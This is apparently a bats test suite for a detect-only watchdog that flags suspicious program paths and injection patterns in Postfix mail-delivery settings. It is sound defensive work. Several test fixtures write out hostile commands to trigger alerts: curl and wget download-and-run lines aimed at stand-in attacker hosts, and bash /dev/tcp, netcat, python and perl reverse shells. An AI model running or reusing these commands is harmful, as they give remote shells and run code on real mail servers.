#!/usr/bin/env bats
# L2 bats functional tests for the postfix-exec-watchdog scan script.
#
# Postfix runs external programs from master.cf pipe/spawn services
# (`argv=<prog>`) and from main.cf `*_command` directives (mailbox_command,
# …) AS ROOT or a mail user, fired by mail of a matching class — a
# mail-triggered exec surface (T1546). An argv= / *_command program under a
# writable root (/tmp /var/tmp /dev/shm /home), or carrying an injection
# pattern, or a world-writable/non-root config, is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the configs
# in a tmp sandbox via SELFDEF_POSTFIX_MASTER / _MAIN.
#
# Run with: bats packaging/test/L2-postfix-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd/postfix-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    MASTER="${TMP}/master.cf"
    MAIN="${TMP}/main.cf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_POSTFIX_PROFILE="${PROFILE:-report}" \
    SELFDEF_POSTFIX_BASELINE="${BASELINE}" \
    SELFDEF_POSTFIX_MASTER="${MASTER_F:-$MASTER}" \
    SELFDEF_POSTFIX_MAIN="${MAIN_F:-$MAIN}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# A benign Postfix exec posture: a maildrop pipe service + a procmail
# mailbox_command, both under /usr (trusted).
seed_benign() {
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}\n' > "${MASTER}"
    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n' > "${MAIN}"
}

# ============================================================
# ok tier
# ============================================================

@test "no postfix config → ok / no_postfix" {
    MASTER_F="${TMP}/nonexistent-master" MAIN_F="${TMP}/nonexistent-main" run_wd
    cap | grep -q '"event":"no_postfix"'
    cap | grep -q '"severity":"ok"'
}

@test "benign argv + mailbox_command, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / postfix_exec_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a master.cf argv= under a writable root → alert / postfix_exec_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a main.cf mailbox_command under a writable root → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = /dev/shm/.deliver\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in a *_command directive → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = curl http://evil/p|sh\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign argv change → warn / postfix_exec_changed" {
    seed_benign
    run_wd
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop2 -d ${recipient}\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"postfix_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr-rooted argv + mailbox_command is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious argv" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — postfix inventory enumerates mail-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (argv under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/var/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (argv under /home): user-writable hijack coverage" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/home/user/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell pattern in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = wget -qO- http://attacker/p | sh\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-postfix-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): postfix-exec-watchdog does NOT refresh baseline on suspicious-exec detection — alert STAYS until operator updates" {
    # T1546 mail-triggered root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'mailbox_command = /tmp/.deliver\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"postfix_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious mailbox_command NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n# mailbox_command = /tmp/.example-attacker\n' > "${MAIN}"
    run_wd
    ! cap | grep -q '"event":"postfix_exec_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (additional *_command directives covered: pipe_command + forward_command — not just mailbox_command)" {
    # Postfix has multiple *_command directives. The watchdog must scan
    # ALL of them.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'forward_command = /tmp/.attacker\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = curl -s http://attacker.com/p | bash\n' > "${MAIN}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in mailbox_command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. postfix mailbox_command runs AS THE
    # RECIPIENT USER (or root for system mailboxes) on every
    # delivered message — a remotely-triggerable exec surface
    # (anyone who can send mail to root@host triggers root exec
    # via mailbox_command). Closes the nc reverse-shell sister axis
    # on the mail-triggered exec surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = nc -e /bin/sh 1.1.1.1 4444\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on postfix mail-delivery surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the mail-
    # triggered exec surface (T1546 — Event Triggered Execution
    # via mail delivery; postfix mailbox_command runs AS the
    # recipient user or root on every delivered message —
    # remotely-triggerable by anyone who sends mail).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on postfix mail-delivery surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp postfix
    # mailbox_command rev-shell variants. Perl on every Debian/
    # Ubuntu host. Locks perl axis on T1546 mail-triggered exec
    # — mailbox_command runs AS recipient user/root on every
    # delivered message, remotely-triggerable by sender.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: mailbox_command invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. Beyond
    # inline reverse-shell payloads, attackers may set a benign-
    # looking mailbox_command that invokes a binary they've
    # staged in /tmp / /var/tmp / /dev/shm. T1546 mail-triggered
    # exec — mailbox_command runs AS recipient user / root on
    # every delivered message, remotely-triggerable by sender —
    # then runs the writable-root binary on every mail. Locks
    # writable-root-exec axis on postfix mail-delivery surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /var/tmp/staged_payload\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: mailbox_command invoking binary from /dev/shm → alert)" {
    # Sister to /var/tmp postfix mail-delivery writable-root.
    # /dev/shm tmpfs in-RAM.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /dev/shm/staged_payload\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on postfix surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The postfix-exec-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 MTA-mail-delivery-trigger root-exec
    # persistence alert. Locks parser contract on the postfix
    # main.cf *_command detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf 'mailbox_command = /tmp/.evil\n' > "${MAIN}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # postfix-exec-watchdog runs ON the timer's scheduled fire —
    # scans Postfix main.cf mailbox_command + transport for
    # injection patterns, emits a verdict, then exits. Type=
    # simple would break timer OnUnitActiveSec semantics. Locks
    # oneshot-probe contract on the postfix-exec-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd/selfdef-postfix-exec.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. postfix-exec-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # postfix-exec-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # postfix-exec-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'postfix-exec-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: postfix-exec-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. postfix-exec-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the postfix-exec-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (postfix-exec-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the postfix-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # postfix-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # postfix-exec-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the postfix-exec-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # postfix-exec-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the postfix-exec-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (postfix-exec-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the postfix-exec-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the postfix-exec-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the postfix-exec-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the postfix-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (postfix-exec-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the postfix-exec-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}
